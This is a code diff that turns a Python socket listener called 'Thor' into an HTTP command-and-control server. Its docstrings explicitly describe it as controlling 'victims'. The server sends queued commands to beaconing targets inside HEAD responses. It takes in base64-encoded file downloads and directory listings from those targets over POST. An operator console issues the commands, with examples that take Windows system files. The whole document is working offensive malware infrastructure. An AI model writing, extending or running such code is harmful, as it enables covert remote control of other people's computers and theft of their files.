@@ -1,176 +1,194 @@
-from CONST import COMMANDS, NUM_OF_THREADS, NUM_OF_JOBS
-import threading
-import signal
-import socket
-from queue import Queue
+import base64
+import os
+
+from CONST import *
+from http.server import BaseHTTPRequestHandler, HTTPServer
+from IPy import IP
 import logging
+import threading
 import sys
-import time
 
 
-queue = Queue()
+class Thor(BaseHTTPRequestHandler):
+    all_connections = {}
 
-class Thor():
+    def log_message(self, format, *args):
+        """ overrides BaseHTTPRequestHandler.log_message method to avoid printing header """
+        return
 
-    def __init__(self):
-        self.host = ''
-        self.port = 9999
-        self.socket = None
-        self.all_connections = []
-        self.all_ip_addresses = []
-
-    def help(self):
+    def do_HEAD(self):
         """
-        help function
-        """
-        for cmd, description in COMMANDS.items():
-            print(f'{cmd}:\t{description}')
-
-    def socket_create(self):
-        try:
-            self.socket = socket.socket()
-        except socket.error as msg:
-            print(f'Socket creation error: {str(msg)}')
-            logging.error(f'Socket creation error: {str(msg)}')
-            sys.exit(1)
-        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-
-    def socket_bind(self):
-        """
-        Bind socket to port & wait for connection from target
-        """
-        try:
-            self.socket.bind((self.host, self.port))
-            self.socket.listen(5)
-        except socket.error as msg:
-            print(f'Socket binding error: {str(msg)}')
-            logging.error(f'Socket binding error: {str(msg)}')
-            time.sleep(5)
-            self.socket_bind()
-
-    def accept_connections(self):
-        """ Accept connections from multiple clients and append to list """
-        for connection in self.all_connections:
-            connection.close()
-        self.all_connections = []
-        self.all_addresses = []
-        while True:
+        this function operates whenever the target sends HEAD request to the server
+        check if victim is connected to server, and send the command
+         """
+        client_ip = str(self.client_address[0])
+        # print(f'{client_ip} has connected to the server')
+        logging.info(f'{client_ip} has connected to the server')
+        if client_ip in Thor.all_connections.keys():
             try:
-                conn, address = self.socket.accept()
-                conn.setblocking(1)
-                client_hostname = conn.recv(1024).decode("utf-8")
-                address = address + (client_hostname,)
+                self.send_response(200, message=Thor.all_connections[client_ip])
+                self.end_headers()
+                logging.info(f'command: {Thor.all_connections[client_ip]} sent to target:{client_ip}')
             except Exception as e:
-                print('Error accepting connections: %s' % str(e))
-                # Loop indefinitely
-                continue
-            self.all_connections.append(conn)
-            self.all_addresses.append(address)
-            print(f'\nConnection has been established: {address[-1]} ({address[0]})')
-
-    # def register_signal_handler(self):
-    #     signal.signal(signal.SIGINT, self.quit_gracefully)
-    #     signal.signal(signal.SIGTERM, self.quit_gracefully)
-
-
-    def handle_command(self):
-        """
-        Interactive prompt for sending commands remotely
-        """
-        while True:
-            cmd = input('> ')
-            if cmd == 'clients':
-                self.show_targets()
-            elif 'client' in cmd:
-                try:
-                    target_id = int(cmd.split(' ')[-1])
-                    target_id, connection = self.connect_to_target(target_id)
-                    if connection is not None:
-                        self.send_target_commands(target_id, connection)
-                except ValueError:
-                    print('Enter a valid index (integer)')
-
-
-    def show_targets(self):
-        """
-        Show all targets available
-        """
-        print('ID\t-\tClient Addresses')
-        for i, client in enumerate(self.all_ip_addresses):
-            print(f'{i}\t-\t{client}')
-
-    def connect_to_target(self, id):
-        try:
-            connection = self.all_connections[id]
-        except IndexError:
-            print('Not a valid selection')
-            return None, None
-        print(f'Connected to {self.all_ip_addresses[id]}')
-        logging.info(f'Connected to {self.all_ip_addresses[id]}')
-        return id, connection
-
-    def send_target_commands(self, id, connection):
-        """
-        Send commands to target
-        :param id:
-        :param connection:
-        """
-        while True:
+                logging.error(f'error sending command to target: {e}')
+            del Thor.all_connections[client_ip]
+        else:
             try:
-                cmd = str.encode(input('> '))
-                if len(cmd) > 0:
-                    connection.send(cmd)
-                    response = self.get_response_from_target(connection)
-                    print(str(response))
-                if cmd == 'quit':
-                    break
+                self.send_response(204, message='')
+                self.end_headers()
             except Exception as e:
-                print(f'Connection lost {str(e)}')
-                logging.error(f'Connection lost - {self.all_ip_addresses[id]}')
-                break
-        del self.all_connections[id]
-        del self.all_ip_addresses[id]
+                logging.error(f'error sending response to target: {e}')
 
-    def get_response_from_target(self, connection):
+    def do_GET(self):
         pass
 
-def create_workers():
-    """
-    Create workers threads
-    """
-    server = Thor()
-    for _ in range(NUM_OF_THREADS):
-        t = threading.Thread(target=work, args=(server,))
-        t.daemon = True
-        t.start()
+    def do_POST(self):
+        """
+        this function operates whenever the target sends POST request to the server
+        The victim will send the appropriate results according to the command sent
+        """
+        if self.path == 'download':
+            with open(VICTIMS_FILES_PATH, 'wb') as f:
+                f.write(base64.b64decode(self.rfile.read()))
+        if self.path == 'dir':
+            with open(DIRLIST_PATH, 'wb') as f:
+                f.write(base64.b64decode(self.rfile.read()))
 
-def work(server):
-    """
-    Do the next job in queue
-    (thread for handling connections, thread for sending commands)
-    :param server:
-    """
-    while True:
-        job_number = queue.get()
-        if job_number == 1:
-            server.socket_create()
-            server.socket_bind()
-            server.accept_connections()
-        if job_number == 2:
-            server.handle_command()
-        queue.task_done()
+    @staticmethod
+    def validate_command(command):
+        """
+        check if the command is valid
+        :param command: string
+        """
+        command_args = None
+        command = command.split(' ', 2)
+        if len(command) < 2:
+            # the minimum valid len(command) can be 2
+            logging.error('command is not valid')
+            Thor.show_help()
+            return None, None, None
+        elif len(command) > 2:
+            # command args given, validate the args
+            try:
+                command_args = command[2].split('"')[1::2]
+                if command[1] == 'dir' and len(command_args) != 1:
+                    # dir command was given but the number of argument given is invalid
+                    raise Exception
+            except Exception as e:
+                print(e)
+                logging.error('command argument not valid')
+                Thor.show_help()
+                return None, None, None
+        if Thor.is_ip_address(command[0]):
+            # the IP address given is valid
+            client_address = command[0]
+        else:
+            Thor.show_help()
+            return None, None, None
+        if Thor.is_allowed_command(command[1]):
+            # the command is valid
+            cmd = command[1]
+        else:
+            logging.error('command is not valid')
+            Thor.show_help()
+            return None, None, None
+        return client_address, cmd, command_args
 
-def create_jobs():
-    """
-    Each list item is a new job
-    """
-    for job_number in NUM_OF_JOBS:
-        queue.put(job_number)
-    queue.join()
+    @staticmethod
+    def is_allowed_command(command):
+        """
+        returns True if command is valid, else False
+        :param command: string
+        :return: boolean
+        """
+        return True if command in ALLOWED_COMMANDS else False
+
+    @staticmethod
+    def is_ip_address(ip):
+        """
+        returns True if IP is valid, else False
+        :param ip: string
+        :return: boolean
+        """
+        try:
+            IP(ip)
+            return True
+        except ValueError:
+            logging.error(f'{ip} is not a valid IP address')
+            print(f'{ip} is not a valid IP address')
+            return False
+
+    @classmethod
+    def send_commands(cls):
+        """
+        waiting for commands, and organizing them in the all_connections dict
+        """
+        Thor.banner()
+        Thor.show_help()
+        try:
+            while True:
+                prompt = input('\n> ')
+                client_address, cmd, command_args = Thor.validate_command(prompt)
+                if client_address and cmd and command_args:
+                    cls.all_connections[client_address] = [cmd] + command_args
+                else:
+                    continue
+        except EOFError:
+            print('quitting gracefully')
+            sys.exit(0)
+
+    @staticmethod
+    def create_output_dirs(OUTPUT_DIR):
+        if not os.path.exists(os.path.split(OUTPUT_DIR)[0]):
+            os.makedirs(os.path.split(OUTPUT_DIR)[0])
+
+    @staticmethod
+    def banner():
+        """
+        prints that amazing banner
+        """
+        print(
+            """
+████████╗██╗  ██╗ ██████╗ ██████╗ 
+╚══██╔══╝██║  ██║██╔═══██╗██╔══██╗
+   ██║   ███████║██║   ██║██████╔╝
+   ██║   ██╔══██║██║   ██║██╔══██╗
+   ██║   ██║  ██║╚██████╔╝██║  ██║
+   ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝
+            """
+        )
+
+    @staticmethod
+    def show_help():
+        """
+        prints the available commands, including descriptions and examples
+        :return:
+        """
+        print('\nusage: IP COMMAND [ARGS]\t(whitespaces between each word)')
+        print('\tsupported commands:')
+        print('\t* dir [path] - show all files and dirs in given path')
+        print('\t* download [path] [path] ... - download the paths given (can take one or more paths)')
+        # print('\t* process-list - show target process list')
+        # print('\t* screenshot - take screenshot and save it to servers screenshots directory')
+        print('\n\texamples:')
+        print('\t173.121.5.83 download "c:\\windows\\iis.log" "c:\\windows\\example.txt"')
+        # print('\t173.121.5.83 screenshot')
+        print('\t173.121.5.83 dir "c:\\windows"')
+
 
 def main():
-    logging.basicConfig(filename='Thor_logs.log',
-                        format='%(asctime)s [%(levelname)s] %(message)s',
-                        level=logging.INFO)
-    create_workers()
-    create_jobs()
+    global server
+    logging.basicConfig(filename=r'thor_logs.log', format='%(asctime)s [%(levelname)s] %(message)s', level=logging.INFO)
+    Thor.create_output_dirs(OUTPUT_DIR)
+    server = HTTPServer((HOST, PORT), Thor)
+    t = threading.Thread(target=Thor.send_commands)
+    t.daemon = True
+    t.start()
+    try:
+        server.serve_forever()
+    except KeyboardInterrupt:
+        server.socket.close()
+
+
+if __name__ == '__main__':
+    main()
